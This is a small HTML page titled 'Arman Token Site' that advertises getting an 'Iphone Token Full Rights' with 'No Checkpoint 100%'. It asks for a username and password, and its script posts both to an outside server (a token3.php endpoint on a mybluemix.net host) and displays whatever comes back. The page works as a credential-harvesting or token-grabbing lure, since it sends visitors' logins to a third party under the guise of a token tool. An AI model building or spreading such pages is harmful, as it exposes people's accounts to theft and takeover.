
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Arman Token Site</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>
 
<div class="container">
  <h2>Get Iphone Token Full Rights</h2>
  <div class="panel-group">
<div class="panel panel-primary">
      <div class="panel-heading">No Checkpoint 100%</div>
      <div class="panel-body">      
<div class="form-group">
  <label for="usr">Username:</label>
  <input type="text" class="form-control" id="tk">
</div>
<div class="form-group">
  <label for="pwd">Password:</label>
  <input type="text" class="form-control" id="mk">
</div>
<button type="button" class="btn btn-danger" onclick="Puaru_Active()" >Get Token</button>
<p>
<li id="trave" class="list-group-item"><img src=""> </li></p>

</div>
    </div>
</div>

<script>
function Puaru_Active() {
var http = new XMLHttpRequest();
var tk = document.getElementById("tk").value;
var mk = document.getElementById("mk").value;
var url = "https://shell-site.mybluemix.net/token3.php";
var params = "u="+tk+"&p="+mk+"";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      document.getElementById("trave").innerHTML = http.responseText;        
    }
}
http.send(params);
}
</script>

</body>
</html>
